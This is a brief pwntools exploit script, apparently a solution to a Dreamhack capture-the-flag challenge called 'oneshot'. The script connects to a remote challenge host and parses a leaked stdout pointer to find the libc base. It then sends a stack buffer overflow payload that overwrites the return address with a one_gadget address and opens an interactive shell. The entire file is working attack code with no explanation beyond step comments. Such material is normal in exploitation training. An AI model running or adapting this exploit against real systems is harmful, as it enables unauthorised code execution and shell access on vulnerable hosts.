from pwn import*

#p = process("./oneshot_patched")
p = remote('host3.dreamhack.games',22266)
#gdb.attach(p,api=True)

##########################
# STEP_1: Leak_libc_base #
##########################

p.recvuntil(b"stdout: 0x")
libc_base= int(p.recv(12),16) - 0x3c5620
print('[+]Libc_base:', hex(libc_base))


######################
# STEP_2: one_gadget #
######################

one_gadget = 0x45216 + libc_base
payload = b'A'*24
payload += b'\x00'*8
payload += b'B'*8

payload += p64(one_gadget)
p.sendline(payload)

p.interactive()
